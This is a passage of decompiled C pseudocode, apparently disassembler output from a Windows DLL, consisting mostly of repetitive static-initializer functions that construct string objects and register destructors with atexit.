  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_10186E30);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3AE8);
}
// 10186E30: using guessed type _DWORD dword_10186E30[3];
// 100C84E5: using guessed type int var_28[5];

//----- (100C854E) --------------------------------------------------------
int sub_100C854E()
{
  _DWORD *v0; // eax
  _DWORD *v1; // eax
  int v3[5]; // [esp+10h] [ebp-28h] BYREF
  int v4[4]; // [esp+24h] [ebp-14h] BYREF
  int v5; // [esp+34h] [ebp-4h]

  v0 = sub_1000D17D(v4, asc_10175154);
  v5 = 0;
  v1 = sub_1000CE46(v0, v3);
  LOBYTE(v5) = 1;
  sub_1000B36F(v1, (int)dword_10186E9C);
  LOBYTE(v5) = 0;
  sub_1000B3DF(v3);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3AF2);
}
// 10186E9C: using guessed type _DWORD dword_10186E9C[3];
// 100C854E: using guessed type int var_28[5];

//----- (100C85B0) --------------------------------------------------------
int sub_100C85B0()
{
  _DWORD *v0; // eax
  _DWORD *v1; // eax
  int v3[5]; // [esp+10h] [ebp-28h] BYREF
  int v4[4]; // [esp+24h] [ebp-14h] BYREF
  int v5; // [esp+34h] [ebp-4h]

  v0 = sub_1000D17D(v4, asc_1017515C);
  v5 = 0;
  v1 = sub_1000CE46(v0, v3);
  LOBYTE(v5) = 1;
  sub_1000B36F(v1, (int)dword_10186DF4);
  LOBYTE(v5) = 0;
  sub_1000B3DF(v3);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3AFC);
}
// 10186DF4: using guessed type _DWORD dword_10186DF4[3];
// 100C85B0: using guessed type int var_28[5];

//----- (100C8612) --------------------------------------------------------
int sub_100C8612()
{
  _DWORD *v0; // eax
  _DWORD *v1; // eax
  int v3[5]; // [esp+10h] [ebp-28h] BYREF
  int v4[4]; // [esp+24h] [ebp-14h] BYREF
  int v5; // [esp+34h] [ebp-4h]

  v0 = sub_1000D17D(v4, asc_10175164);
  v5 = 0;
  v1 = sub_1000CE46(v0, v3);
  LOBYTE(v5) = 1;
  sub_1000B36F(v1, (int)dword_10186E74);
  LOBYTE(v5) = 0;
  sub_1000B3DF(v3);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3B06);
}
// 10186E74: using guessed type _DWORD dword_10186E74[3];
// 100C8612: using guessed type int var_28[5];

//----- (100C8674) --------------------------------------------------------
int sub_100C8674()
{
  _DWORD *v0; // eax
  _DWORD *v1; // eax
  int v3[5]; // [esp+10h] [ebp-28h] BYREF
  int v4[4]; // [esp+24h] [ebp-14h] BYREF
  int v5; // [esp+34h] [ebp-4h]

  v0 = sub_1000D17D(v4, asc_10175168);
  v5 = 0;
  v1 = sub_1000CE46(v0, v3);
  LOBYTE(v5) = 1;
  sub_1000B36F(v1, (int)dword_10186D74);
  LOBYTE(v5) = 0;
  sub_1000B3DF(v3);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3B10);
}
// 10186D74: using guessed type _DWORD dword_10186D74[5];
// 100C8674: using guessed type int var_28[5];

//----- (100C86D6) --------------------------------------------------------
int sub_100C86D6()
{
  _DWORD *v0; // eax
  _DWORD *v1; // eax
  int v3[5]; // [esp+10h] [ebp-28h] BYREF
  int v4[4]; // [esp+24h] [ebp-14h] BYREF
  int v5; // [esp+34h] [ebp-4h]

  v0 = sub_1000D17D(v4, asc_1017516C);
  v5 = 0;
  v1 = sub_1000CE46(v0, v3);
  LOBYTE(v5) = 1;
  sub_1000B36F(v1, (int)dword_10186DB8);
  LOBYTE(v5) = 0;
  sub_1000B3DF(v3);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3B1A);
}
// 10186DB8: using guessed type _DWORD dword_10186DB8[5];
// 100C86D6: using guessed type int var_28[5];

//----- (100C8738) --------------------------------------------------------
int sub_100C8738()
{
  _DWORD *v0; // eax
  _DWORD *v1; // eax
  int v3[5]; // [esp+10h] [ebp-28h] BYREF
  int v4[4]; // [esp+24h] [ebp-14h] BYREF
  int v5; // [esp+34h] [ebp-4h]

  v0 = sub_1000D17D(v4, a0Obj);
  v5 = 0;
  v1 = sub_1000CE46(v0, v3);
  LOBYTE(v5) = 1;
  sub_1000B36F(v1, (int)dword_10186D88);
  LOBYTE(v5) = 0;
  sub_1000B3DF(v3);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3B24);
}
// 10186D88: using guessed type _DWORD dword_10186D88[3];
// 100C8738: using guessed type int var_28[5];

//----- (100C879A) --------------------------------------------------------
int sub_100C879A()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174CB0);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186EC4, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3B2E);
}
// 10186EC4: using guessed type _DWORD dword_10186EC4[2];

//----- (100C87EE) --------------------------------------------------------
int sub_100C87EE()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174DB0);
  sub_1000D17D(dword_10186ED4, v0);
  return atexit(sub_100F3B38);
}
// 10186ED4: using guessed type _DWORD dword_10186ED4[2];

//----- (100C8810) --------------------------------------------------------
int sub_100C8810()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174E08);
  sub_1000D17D(dword_10186EDC, v0);
  return atexit(sub_100F3B42);
}
// 10186EDC: using guessed type _DWORD dword_10186EDC[2];

//----- (100C8832) --------------------------------------------------------
int sub_100C8832()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174E58);
  sub_1000D17D(dword_10186ECC, v0);
  return atexit(sub_100F3B4C);
}
// 10186ECC: using guessed type _DWORD dword_10186ECC[2];

//----- (100C8854) --------------------------------------------------------
int sub_100C8854()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174A00);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186EE4, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3B56);
}
// 10186EE4: using guessed type _DWORD dword_10186EE4[2];

//----- (100C88A8) --------------------------------------------------------
int sub_100C88A8()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174B00);
  sub_1000D17D(dword_10186EF4, v0);
  return atexit(sub_100F3B60);
}
// 10186EF4: using guessed type _DWORD dword_10186EF4[2];

//----- (100C88CA) --------------------------------------------------------
int sub_100C88CA()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174B58);
  sub_1000D17D(dword_10186EEC, v0);
  return atexit(sub_100F3B6A);
}
// 10186EEC: using guessed type _DWORD dword_10186EEC[2];

//----- (100C88EC) --------------------------------------------------------
#error "100C88EC: too big function (funcsize=0)"

//----- (100F2200) --------------------------------------------------------
int sub_100F2200()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101743E8);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186F54, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3B8B);
}
// 10186F54: using guessed type _DWORD dword_10186F54[2];

//----- (100F2254) --------------------------------------------------------
int sub_100F2254()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174430);
  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_1018703C);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3B95);
}
// 1018703C: using guessed type _DWORD dword_1018703C[3];
// 100F2254: using guessed type int var_28[5];

//----- (100F22BD) --------------------------------------------------------
int sub_100F22BD()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174468);
  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_10186F38);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3B9F);
}
// 10186F38: using guessed type _DWORD dword_10186F38[3];
// 100F22BD: using guessed type int var_28[5];

//----- (100F2326) --------------------------------------------------------
int sub_100F2326()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174494);
  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_10186F84);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3BA9);
}
// 10186F84: using guessed type _DWORD dword_10186F84[5];
// 100F2326: using guessed type int var_28[5];

//----- (100F238F) --------------------------------------------------------
int sub_100F238F()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101744C0);
  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_10186F98);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3BB3);
}
// 10186F98: using guessed type _DWORD dword_10186F98[3];
// 100F238F: using guessed type int var_28[5];

//----- (100F23F8) --------------------------------------------------------
int sub_100F23F8()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101744EC);
  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_10186FFC);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3BBD);
}
// 10186FFC: using guessed type _DWORD dword_10186FFC[3];
// 100F23F8: using guessed type int var_28[5];

//----- (100F2461) --------------------------------------------------------
int sub_100F2461()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174518);
  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_10186FC0);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3BC7);
}
// 10186FC0: using guessed type _DWORD dword_10186FC0[3];
// 100F2461: using guessed type int var_28[5];

//----- (100F24CA) --------------------------------------------------------
int sub_100F24CA()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174544);
  sub_1000D17D(dword_10187080, v0);
  return atexit(sub_100F3BD1);
}
// 10187080: using guessed type _DWORD dword_10187080[2];

//----- (100F24EC) --------------------------------------------------------
int sub_100F24EC()
{
  _DWORD *v0; // eax
  int v2[7]; // [esp+10h] [ebp-20h] BYREF
  int v3; // [esp+2Ch] [ebp-4h]

  v0 = sub_1000CE46(dword_10187080, v2);
  v3 = 0;
  sub_1000B36F(v0, (int)dword_10186F10);
  v3 = -1;
  sub_1000B3DF(v2);
  return atexit(sub_100F3BDB);
}
// 10186F10: using guessed type int dword_10186F10[5];
// 10187080: using guessed type _DWORD dword_10187080[2];
// 100F24EC: using guessed type int var_20[7];

//----- (100F2533) --------------------------------------------------------
int sub_100F2533()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174570);
  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_10186FE8);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3BE5);
}
// 10186FE8: using guessed type _DWORD dword_10186FE8[5];
// 100F2533: using guessed type int var_28[5];

//----- (100F259C) --------------------------------------------------------
int sub_100F259C()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017459C);
  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_10186F70);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3BEF);
}
// 10186F70: using guessed type _DWORD dword_10186F70[5];
// 100F259C: using guessed type int var_28[5];

//----- (100F2605) --------------------------------------------------------
int sub_100F2605()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101745C8);
  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_10186F5C);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3BF9);
}
// 10186F5C: using guessed type _DWORD dword_10186F5C[5];
// 100F2605: using guessed type int var_28[5];

//----- (100F266E) --------------------------------------------------------
int sub_100F266E()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101745F4);
  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_10187050);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3C03);
}
// 10187050: using guessed type _DWORD dword_10187050[5];
// 100F266E: using guessed type int var_28[5];

//----- (100F26D7) --------------------------------------------------------
int sub_100F26D7()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174620);
  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_10186F24);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3C0D);
}
// 10186F24: using guessed type _DWORD dword_10186F24[3];
// 100F26D7: using guessed type int var_28[5];

//----- (100F2740) --------------------------------------------------------
int sub_100F2740()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017465C);
  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_10186EFC);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3C17);
}
// 10186EFC: using guessed type _DWORD dword_10186EFC[5];
// 100F2740: using guessed type int var_28[5];

//----- (100F27A9) --------------------------------------------------------
int sub_100F27A9()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017469C);
  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_10187028);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3C21);
}
// 10187028: using guessed type _DWORD dword_10187028[5];
// 100F27A9: using guessed type int var_28[5];

//----- (100F2812) --------------------------------------------------------
int sub_100F2812()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101746D8);
  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_10187064);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3C2B);
}
// 10187064: using guessed type _DWORD dword_10187064[5];
// 100F2812: using guessed type int var_28[5];

//----- (100F287B) --------------------------------------------------------
int sub_100F287B()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174718);
  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_10186FAC);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3C35);
}
// 10186FAC: using guessed type _DWORD dword_10186FAC[5];
// 100F287B: using guessed type int var_28[5];

//----- (100F28E4) --------------------------------------------------------
int sub_100F28E4()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174754);
  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_10186FD4);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3C3F);
}
// 10186FD4: using guessed type _DWORD dword_10186FD4[3];
// 100F28E4: using guessed type int var_28[5];

//----- (100F294D) --------------------------------------------------------
int sub_100F294D()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174790);
  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_1019395C);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3C49);
}
// 1019395C: using guessed type _DWORD dword_1019395C[3];
// 100F294D: using guessed type int var_28[5];

//----- (100F29B6) --------------------------------------------------------
int sub_100F29B6()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101747D0);
  sub_1000D17D(&dword_10187098, v0);
  return atexit(sub_100F3C53);
}
// 10187098: using guessed type int dword_10187098;

//----- (100F29D8) --------------------------------------------------------
int sub_100F29D8()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101747FC);
  sub_1000D17D(&dword_10186F4C, v0);
  return atexit(sub_100F3C5D);
}
// 10186F4C: using guessed type int dword_10186F4C;

//----- (100F29FA) --------------------------------------------------------
int sub_100F29FA()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017482C);
  sub_1000D17D(&dword_10187020, v0);
  return atexit(sub_100F3C67);
}
// 10187020: using guessed type int dword_10187020;

//----- (100F2A1C) --------------------------------------------------------
int sub_100F2A1C()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174858);
  sub_1000D17D(&dword_1019394C, v0);
  return atexit(sub_100F3C71);
}
// 1019394C: using guessed type int dword_1019394C;

//----- (100F2A3E) --------------------------------------------------------
int sub_100F2A3E()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174884);
  sub_1000D17D(dword_10187010, v0);
  return atexit(sub_100F3C7B);
}
// 10187010: using guessed type _DWORD dword_10187010[2];

//----- (100F2A60) --------------------------------------------------------
int sub_100F2A60()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101748B0);
  sub_1000D17D(dword_10187088, v0);
  return atexit(sub_100F3C85);
}
// 10187088: using guessed type _DWORD dword_10187088[2];

//----- (100F2A82) --------------------------------------------------------
int sub_100F2A82()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101748DC);
  sub_1000D17D(dword_10193954, v0);
  return atexit(sub_100F3C8F);
}
// 10193954: using guessed type _DWORD dword_10193954[2];

//----- (100F2AA4) --------------------------------------------------------
int sub_100F2AA4()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174908);
  sub_1000D17D(dword_10187090, v0);
  return atexit(sub_100F3C99);
}
// 10187090: using guessed type _DWORD dword_10187090[2];

//----- (100F2AC6) --------------------------------------------------------
int sub_100F2AC6()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174934);
  sub_1000D17D(dword_10187018, v0);
  return atexit(sub_100F3CA3);
}
// 10187018: using guessed type _DWORD dword_10187018[2];

//----- (100F2AE8) --------------------------------------------------------
int sub_100F2AE8()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174960);
  sub_1000D17D(dword_10187078, v0);
  return atexit(sub_100F3CAD);
}
// 10187078: using guessed type _DWORD dword_10187078[2];

//----- (100F2B0A) --------------------------------------------------------
int sub_100F2B0A()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10130A30);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10193970, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3CB7);
}
// 10193970: using guessed type _DWORD dword_10193970[2];

//----- (100F2B5E) --------------------------------------------------------
int sub_100F2B5E()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101308F0);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10193978, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3CC1);
}
// 10193978: using guessed type _DWORD dword_10193978[2];

//----- (100F2BB2) --------------------------------------------------------
int sub_100F2BB2()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10130830);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10193988, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3CCB);
}
// 10193988: using guessed type _DWORD dword_10193988[2];

//----- (100F2C06) --------------------------------------------------------
int sub_100F2C06()
{
  HANDLE EventA; // eax
  DWORD v2; // [esp-8h] [ebp-Ch]
  DWORD CurrentProcessId; // [esp-4h] [ebp-8h]

  CurrentProcessId = GetCurrentProcessId();
  v2 = GetCurrentProcessId();
  EventA = CreateEventA(0, 1, 0, 0);
  sub_10011AF4((int)&dword_1017DB50, EventA, 0, 0, v2, CurrentProcessId);
  return atexit(sub_100F3CD5);
}
// 1017DB50: using guessed type _DWORD dword_1017DB50;

//----- (100F2C3A) --------------------------------------------------------
int sub_100F2C3A()
{
  HANDLE EventA; // eax
  DWORD v2; // [esp-8h] [ebp-Ch]
  DWORD CurrentProcessId; // [esp-4h] [ebp-8h]

  CurrentProcessId = GetCurrentProcessId();
  v2 = GetCurrentProcessId();
  EventA = CreateEventA(0, 0, 0, 0);
  sub_10011AF4((int)&dword_1017DB48, EventA, 0, 0, v2, CurrentProcessId);
  return atexit(sub_100F3CDF);
}
// 1017DB48: using guessed type _DWORD dword_1017DB48;

//----- (100F2C6D) --------------------------------------------------------
int sub_100F2C6D()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10130878);
  sub_1000D17D(dword_10193980, v0);
  return atexit(sub_100F3CE9);
}
// 10193980: using guessed type _DWORD dword_10193980[2];

//----- (100F2C8F) --------------------------------------------------------
int sub_100F2C8F()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10130718);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10193990, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3CF3);
}
// 10193990: using guessed type _DWORD dword_10193990[2];

//----- (100F2CE3) --------------------------------------------------------
int sub_100F2CE3()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10130760);
  sub_1000D17D(dword_101939A0, v0);
  return atexit(sub_100F3CFD);
}
// 101939A0: using guessed type _DWORD dword_101939A0[2];

//----- (100F2D05) --------------------------------------------------------
int sub_100F2D05()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10130794);
  sub_1000D17D(dword_10193998, v0);
  return atexit(sub_100F3D07);
}
// 10193998: using guessed type _DWORD dword_10193998[2];

//----- (100F2D27) --------------------------------------------------------
int sub_100F2D27()
{
